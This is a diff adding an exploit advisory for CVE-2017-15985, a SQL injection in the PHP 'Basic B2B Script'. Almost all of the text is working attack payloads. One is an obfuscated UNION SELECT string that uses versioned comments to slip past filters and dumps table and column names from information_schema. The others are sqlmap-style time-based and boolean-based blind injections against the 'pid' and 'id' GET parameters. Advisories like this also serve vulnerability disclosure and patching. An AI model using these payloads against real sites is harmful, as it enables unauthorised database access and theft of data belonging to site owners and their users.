@@ -1,0 +1,44 @@
+# # # # # 
+# Exploit Title: Basic B2B Script - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://www.phpscriptsmall.com/
+# Software Link: http://www.exclusivescript.com/product/nC3F4570353/php-scripts/basic-b2b-script
+# Demo: http://readymadeb2bscript.com/product/entrepreneur/
+# Version: N/A
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15985
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/product_view1.php?pid=[SQL]
+# 
+# -19'++/*!03333UNION*/+/*!03333SELECT*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,(/*!03333Select*/+export_set(5,@:=0,(/*!03333select*/+count(*)/*!03333from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!03333table_name*/,0x3c6c693e,2),/*!03333column_name*/,0xa3a,2)),@,2)),18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37--+-
+# 
+# http://localhost/[PATH]/productcompanyinfo.php?id=[SQL]
+# 
+# 
+# Parameter: pid (GET)
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: pid=19' AND SLEEP(5) AND 'zgOs'='zgOs
+# 
+# Parameter: id (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: id=309' AND 2824=2824 AND 'AWCd'='AWCd
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: id=309' AND SLEEP(5) AND 'BTCw'='BTCw
+# 
+# Etc..
+# # # # #
